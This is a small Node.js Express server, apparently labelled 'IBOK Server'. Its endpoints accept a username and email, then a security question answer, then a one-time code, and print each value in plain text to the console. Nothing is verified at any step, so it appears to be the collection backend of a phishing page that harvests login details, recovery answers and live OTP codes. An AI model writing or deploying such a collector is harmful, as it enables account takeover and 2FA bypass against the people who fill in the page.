const express = require("express");
const path = require("path");

const app = express();

// قراءة بيانات JSON
app.use(express.json());

// الملفات الثابتة
app.use(express.static(__dirname));

// الصفحة الرئيسية
app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname, "index.html"));
});

// =======================
// Login
// =======================
app.post("/api/login", (req, res) => {
    const { username, email } = req.body;

    console.log("\n========== LOGIN ==========");
    console.log("Username:", username);
    console.log("Email:", email);
    console.log("===========================\n");

    res.status(200).json({
        success: true,
        message: "Login data received"
    });
});

// =======================
// Security
// =======================
app.post("/api/security", (req, res) => {
    const { username, question, answer } = req.body;

    console.log("\n========= SECURITY =========");
    console.log("Username:", username);
    console.log("Question:", question);
    console.log("Answer:", answer);
    console.log("============================\n");

    res.status(200).json({
        success: true,
        message: "Security data received"
    });
});

// =======================
// Demo Code (OTP)
// =======================
app.post("/api/demo", (req, res) => {
    const {
        username,
        email,
        question,
        answer,
        demoCode
    } = req.body;

    console.log("\n=========== DEMO ===========");
    console.log("Username :", username);
    console.log("Email    :", email);
    console.log("Question :", question);
    console.log("Answer   :", answer);
    console.log("DemoCode :", demoCode);
    console.log("============================\n");

    res.status(200).json({
        success: true,
        message: "Demo data received"
    });
});

// تشغيل السيرفر
const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
    console.log(`IBOK Server Running on Port ${PORT}`);
});